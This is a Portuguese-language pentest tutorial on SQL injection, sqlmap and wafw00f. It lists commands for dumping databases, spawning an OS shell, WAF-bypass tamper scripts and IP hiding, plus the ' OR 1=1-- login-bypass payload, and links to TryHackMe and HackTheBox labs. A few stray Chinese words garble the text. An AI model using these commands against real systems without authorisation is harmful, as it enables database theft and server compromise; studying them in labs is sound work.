# 💉 Injeção e Fuzzing

> Detecção e exploração de SQL Injection e bypass de WAF.

---

## 📚 O que é SQL Injection e Fuzzing?

**SQL Injection** é inserir código SQL malicioso em inputs de aplicações web para manipular o banco de dados. **Fuzzing** é enviar dados aleatórios ou malformados para encontrar vulnerabilidades em software.

### Por que isso é importante?

- SQLi é uma das vulnerabilidades **mais perigosas e comuns** (OWASP Top 10)
- Permite **extrair dados sensiveis** (senhas, dados pessoais, cartões)
- Pode conceder **shell do servidor** em casos extremos
- Fuzzing revela bugs que testes manuais **não encontram**

### Como funciona na prática?

```
Usuário insere:  admin' OR 1=1--
 查询 original:   SELECT * FROM users WHERE user='admin'
 查询 modificada:  SELECT * FROM users WHERE user='admin' OR 1=1--
 Resultado:       Retorna TODOS os usuários (bypass de autenticação)
```

### Ferramentas

| Ferramenta | O que faz |
|:---|:---|
| **SQLMap** | Detecção e exploração automática de SQLi |
| **WAFw00f** | Detecta se site usa WAF |
| **Burp Suite** | Intercepta e manipula requests HTTP |
| **FFUF** | Fuzzing rápido de endpoints e parâmetros |

---

## SQLMap

Detecção e exploração automática de SQL Injection. Uma das ferramentas mais poderosas para web security.

### 🎯 Quando usar o SQLMap
Quando encontrou um parâmetro que aceita input. Use quando:
- Precisar **testar SQL Injection** em qualquer parâmetro
- Precisar **extrair dados** de um banco de dados
- Precisar **listar bancos, tabelas e colunas**
- Precisar de **shell do servidor** (em casos extremos)
- Quiser **automatizar** a exploração de SQLi

### 🛠️ Como o SQLMap te ajuda
- **Detecção automática** → Descobre tipo de SQLi (error, blind, union, time)
- **Extração** → Dump de bancos, tabelas, colunas
- **Bypass** → Tamper scripts para bypass de WAF
- **Shell** → OS shell, SQL shell em casos avançados

### ➡️ Depois de rodar o SQLMap — Próximos passos
1. **SQLi confirmado?** → Liste bancos: `sqlmap -u URL --dbs --batch`
2. **Banco encontrado?** → Liste tabelas: `sqlmap -u URL -D banco --tables --batch`
3. **Tabelas sensíveis?** → Dump: `sqlmap -u URL -D banco -T tabela --dump --batch`
4. **WAF bloqueando?** → Use tamper: `sqlmap -u URL --tamper=space2comment,between --batch`
5. **Salve o output** → SQLMap salva automaticamente em `~/.sqlmap/output/`

### Instalação
```bash
sudo apt install -y sqlmap
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-u` | URL com parâmetros |
| `--data` | Dados POST |
| `--batch` | Modo automático (sem perguntas) |
| `--level` | Nível de testes (1-5, padrão 1) |
| `--risk` | Risco dos testes (1-3, padrão 1) |
| `--dbs` | Listar bancos de dados |
| `--tables` | Listar tabelas |
| `--columns` | Listar colunas |
| `--dump` | Baixar dados |
| `--os-shell` | Shell do SO |
| `--sql-shell` | Shell SQL |
| `--cookie` | Cookie de sessão |
| `--random-agent` | User agent aleatório |
| `--delay` | Delay entre requests |
| `-p` | Parâmetro específico |
| `--tamper` | Script de bypass (WAF) |
| `--technique` | Técnicas específicas |

### Exemplos práticos

```bash
# Scan básico de URL
sqlmap -u "http://target.com/page?id=1" --batch

# Scan mais agressivo
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Com cookie de sessão
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch

# Listar bancos de dados
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Listar tabelas de um banco
sqlmap -u "http://target.com/page?id=1" -D mydb --tables --batch

# Listar colunas de uma tabela
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --columns --batch

# Dump de dados
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump --batch

# Dump de todos os bancos
sqlmap -u "http://target.com/page?id=1" --dump-all --batch

# Shell interativo do SO
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# Shell SQL
sqlmap -u "http://target.com/page?id=1" --sql-shell --batch

# Parâmetro específico
sqlmap -u "http://target.com/page?id=1&name=test" -p id --batch

# User agent aleatório
sqlmap -u "http://target.com/page?id=1" --random-agent --batch

# Com delay (evitar bloqueio)
sqlmap -u "http://target.com/page?id=1" --delay=1 --batch

# Bypass WAF com tamper
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch

# Techniques específicas
sqlmap -u "http://target.com/page?id=1" --technique=BEU --batch
# B = Boolean-based blind
# E = Error-based
# U = UNION query
# S = Stacked queries
# T = Time-based blind
```

### Técnicas de SQL Injection

| Tipo | Como o SQLMap detecta |
|:---|:---|
| **Error-based** | Erros de SQL visíveis na resposta |
| **Boolean-based blind** | Resposta muda dependendo de TRUE/FALSE |
| **Time-based blind** | Delay na resposta indica injeção |
| **UNION query** | Combina resultados de queries |
| **Stacked queries** | Executa múltiplos statements |

### Bypass de WAF
```bash
# Space to comment
sqlmap -u "URL" --tamper=space2comment

# Entre bins
sqlmap -u "URL" --tamper=between

# Múltiplos tamper
sqlmap -u "URL" --tamper=space2comment,between,randomcase
```

---

## WAFw00f

Detecta se o site usa WAF (Web Application Firewall) e qual modelo.

### 🎯 Quando usar o WAFw00f
Antes de qualquer ataque web. Use quando:
- Precisar saber **se o site tem WAF**
- Precisar saber **qual modelo de WAF** (Cloudflare, ModSecurity, etc)
- Precisar **adaptar seus ataques** antes de testar
- Quiser **evitar bloqueios** durante o pentest

### 🛠️ Como o WAFw00f te ajuda
- **Detecção** → Saber se tem WAF antes de atacar
- **Modelo** → Cloudflare, ModSecurity, Imperva (cada um tem bypass diferente)
- **Estratégia** → Com WAF: usar tamper, rate limit, proxychains

### ➡️ Depois de rodar o WAFw00f — Próximos passos
1. **WAF detectado?** → Use tamper no SQLMap: `--tamper=space2comment,between`
2. **Cloudflare?** → Use proxychains ou encontre IP real com `curl -I`
3. **ModSecurity?** → Use payloads específicos de bypass
4. **Sem WAF?** → Pode atacar livremente (mas com cuidado!)

### Instalação
```bash
sudo pip3 install wafw00f
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-a` | Todos os testes |
| `-l` | Listar WAFs suportados |
| `-p` | Proxy |
| `-o` | Output |
| `-f` | Output format (json, txt) |
| `-v` | Verbose |

### Exemplos práticos

```bash
# Detectar WAF
wafw00f example.com

# Todos os testes
wafw00f -a example.com

# Listar WAFs suportados
wafw00f -l

# Com proxy
wafw00f -p http://127.0.0.1:8080 example.com

# Output JSON
wafw00f -o output.json -f json example.com

# Verbose
wafw00f -v example.com
```

### Por que isso importa
Se o site tem WAF, você precisa adaptar seus ataques:
- Usar tamper no SQLMap
- Usar rate limiting mais baixo
- Usar proxychains para esconder IP
- Bypass de WAF com payloads específicos

---

### Resumo da ordem — Por que essa sequência?

Injeção segue a ordem: **detectar → automatizar → explorar → extrair**.

```
PASSO 1: Testar manualmente → Confirmar que SQLi existe
├── POR QUE: Automático pode dar falso positivo, manual confirma
├── O QUE FAZER: Inserir ' OR 1=1 -- e ver se muda comportamento
├── QUANDO AVANÇAR: Quando tiver certeza que há injeção
└── SE DER ERRADO: Se não funcionar, tente aspas dupla, UNION, blind

        ↓

PASSO 2: SQLMap → Automatizar a exploração
├── POR QUE: Manual é lento, SQLMap testa todos os tipos
├── COMANDO: sqlmap -u "http://target.com/page?id=1" --batch
├── QUANDO AVANÇAR: Quando SQLMap confirmar SQLi
└── SE DER ERRADO: Se não detectar, aumente: --level=5 --risk=3

        ↓

PASSO 3: Extrair dados → Pegar informações do banco
├── POR QUE: O objetivo é acessar dados sensiveis
├── COMANDO: sqlmap -u "URL" --dbs --tables --dump
├── QUANDO AVANÇAR: Quando tiver dados extraidos
└── DICAS: Comece por banco 'mysql' ou 'information_schema'

        ↓

PASSO 4: WAF Bypass → Se tiver WAF bloqueando
├── POR QUE: WAF pode bloquear payloads padrão
├── COMANDO: sqlmap -u "URL" --tamper=space2comment,between
├── QUANDO PARAR: Quando conseguir extrair dados
└── DICAS: Teste um tamper por vez para qual funciona
```

**Dica:** Sempre teste SQLi manualmente antes de usar SQLMap — evita falsos positivos.

---

## Lab Prático

### Exercício 1: SQL Injection com SQLMap
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/sqlinjectionlm
- **O que vai praticar:** Detecção automática de SQLi, extração de dados, bypass de WAF e exploração de bancos
- **Tempo estimado:** 60 minutos

### Exercício 2: DVWA - SQL Injection
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/dvwa
- **O que vai praticar:** SQL Injection manual e automatizada, union-based, blind SQLi e uso do SQLMap
- **Tempo estimado:** 45 minutos

### Exercício 3: WAF Bypass
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/wafbypass
- **O que vai praticar:** Técnicas de bypass de WAF, tamper scripts e evasão de firewalls aplicativos
- **Tempo estimado:** 40 minutos

### Exercício 4: Injection Foundations
- **Plataforma:** HackTheBox
- **Link:** https://app.hackthebox.com/starting-point
- **O que vai praticar:** SQL Injection básica, identificação de vulnerabilidades e extração de dados sensiveis
- **Tempo estimado:** 90 minutos

### Dica de Estudo
> Comece sempre pelo SQLMap em modo `--batch` para detecção rápida. Depois, prague manualmente com payloads básicos (`' OR 1=1 --`). Documente cada técnica encontrada e对应的 WAF (se houver). Use tamper scripts para bypass quando necessário.
